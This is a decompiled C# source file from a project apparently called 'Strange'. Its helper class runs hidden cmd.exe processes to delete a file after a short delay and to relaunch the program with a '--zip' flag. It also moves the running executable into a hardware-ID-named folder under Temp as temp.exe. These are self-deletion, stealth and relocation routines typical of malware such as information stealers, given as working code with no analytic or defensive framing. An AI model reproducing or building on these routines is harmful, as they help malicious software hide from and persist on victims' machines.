using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using Strange.Additions;

namespace Strange
{
	// Token: 0x02000005 RID: 5
	internal class Miscellaneous
	{
		// Token: 0x06000007 RID: 7 RVA: 0x000022C8 File Offset: 0x000004C8
		public static void Delete(string dir, string name)
		{
			Process.Start(new ProcessStartInfo
			{
				Arguments = "/C choice /C Y /N /D Y /T 1 & Del \"" + name + "\"",
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = "cmd.exe"
			});
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00002314 File Offset: 0x00000514
		public static void SelfRestart(string name)
		{
			Process.Start(new ProcessStartInfo
			{
				Arguments = "/C choice /C Y /N /D Y /T 1 & \"" + name + " --zip\"",
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = "cmd.exe"
			});
		}

		// Token: 0x06000009 RID: 9 RVA: 0x00002360 File Offset: 0x00000560
		public static string Move()
		{
			try
			{
				string text = Environment.GetEnvironmentVariable("Temp") + "\\" + Hwid.Getid();
				Directory.CreateDirectory(text);
				File.Move(Directory.GetCurrentDirectory() + "\\" + new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name, text + "\\temp.exe");
				return text;
			}
			catch (Exception)
			{
			}
			return null;
		}
	}
}
